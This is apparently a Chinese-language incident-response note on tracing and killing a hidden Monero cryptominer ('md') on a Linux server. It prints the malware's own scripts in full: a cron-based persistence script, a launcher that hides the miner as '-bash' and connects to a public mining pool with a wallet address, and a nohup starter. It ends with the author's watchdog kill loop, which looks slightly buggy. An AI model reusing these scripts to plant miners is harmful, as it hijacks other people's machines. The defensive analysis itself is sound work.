# 查杀挖矿机进程md

`[root@localhost]# top` 查看到md（占用cpu近100%）的PID 4444  
`[root@localhost]# cd /proc/4444`  
`[root@localhost]# ll`  
重点关注cmdline 和 exe,cwd 等  
cwd 指向 /lib/modules/.z (这个目录里放着挖矿的程序)  
exe指向 /lib/modules/.z/md (这个就是占用100%cpu的家伙)  
`[root@localhost]# cat cmdline`   
这里看到如下字样，pool.minexmr.com 基本上跟挖矿有关了    
`-bash -acryptonight-os tratum+tcp://pool.minexmr.com:7777`   
```
[root@localhost]# cd /lib/modules/.z/
[root@localhost .z]# ll
```
 ll结果如下，h32,h64,md,mdx都是二进制文件  
 我们可以从a, run, x 三个文件里看到些端倪  
```
-rw-r--r--. 1 root root       0 Nov 23 15:40 $
-rwxr-xr-x. 1 root root     332 Oct  5 03:07 a
-rw-r--r--. 1 root root       1 Nov 23 18:07 bash.pid
-rwxr-xr-x. 1 1001 1001   15125 Feb 21  2016 h32
-rwxr-xr-x. 1 1001 1001  838583 Feb 21  2016 h64
-rwxr-xr-x. 1 root root 2979640 Jun 24 04:19 md
-rwxr-xr-x. 1 root root  168896 Sep 27 18:58 mdx
-rwxr-xr-x. 1 root root     533 Nov 19 22:41 run
-rw-r--r--. 1 root root    4833 Nov 23 16:24 screenlog.0
-rwxr-xr-x. 1 root root      24 Oct  5 02:45 x
```
`[root@localhost .z]# cat a `
```
pwd > dir.dir
dir=$(cat dir.dir)
echo "* * * * * $dir/upd >/dev/null 2>&1" > cron.d
crontab cron.d
crontab -l | grep upd
echo "#!/bin/sh
if test -r $dir/bash.pid; then
pid=\$(cat $dir/bash.pid)
if \$(kill -CHLD \$pid >/dev/null 2>&1)
then
exit 0
fi
fi
cd $dir
./run &>/dev/null" > upd
chmod u+x upd
rm -rf ../dwk.tgz
rm -rf ../z.sh
```
 cron.d 和 upd文件都没有找到，使用locate 命令，也没有搜索到，  
 使用kill 4444 之后，停几个小时，md会重新执行（即使给.z文件夹改名也没用，删除也没有用，还是会启动）  
  怀疑存在父进程，或定时任务，但是使用crontab -l 查看没有定时任务（无语）  
`[root@localhost .z]# cat run`  
```
#!/bin/bash

proc=`nproc`
ARCH=`uname -m`
HIDE="-bash"

if [ "$ARCH" == "i686" ];       then
        ./h32 -s $HIDE ./md -a cryptonight -o stratum+tcp://pool.minexmr.com:7777 -u 45MmwEsgnjtHynmvDDV8pbZJibfhFVjtV9cTaFW4H8N9hNZDpMoYr7J1ZCE3wJAjWN9Dj3iASPxtjEKNZEriwJjx2evayFY -p x >>$
elif [ "$ARCH" == "x86_64" ];   then
        ./h64 -s $HIDE ./md -a cryptonight -o stratum+tcp://pool.minexmr.com:7777 -u 45MmwEsgnjtHynmvDDV8pbZJibfhFVjtV9cTaFW4H8N9hNZDpMoYr7J1ZCE3wJAjWN9Dj3iASPxtjEKNZEriwJjx2evayFY -p x >>$
fi
echo $! > bash.pid
```
[root@localhost .z]# cat x
```
nohup ./a >>/dev/null &
```
-------------
 无奈只能曲线救国，写了一个守护进程，一旦看到md运行就kill掉它  
 其中ps -ef 结果的第三列是父进程，为了追综始作俑者。  
 一般命令行运行的程序好像父进程是1？  
```
#!/bin/sh
proc_name="^sh md$" 
file_name="/data2/lzc/watchMD.log"

echo `date` = NUM = PID > $file_name
while true
do
 num=`pgrep -x "$proc_name" | wc -l`
 if [ 0 -lt $num ]
 then
    pid=`pgrep -x "$proc_name"`
    ps -ef | grep $pid | grep -v grep >> $file_name
    echo == >> $file_name
    par=(`ps -ef | grep $pid | grep -v grep | cut -f3`)
    ps -ef | grep ${par[0]} | grep -v grep >> $file_name
    echo ==== >> $file_name
    kill $pid
    echo `date` =  $num  = $pid >> $file_name
 fi
 sleep 2
done  
```
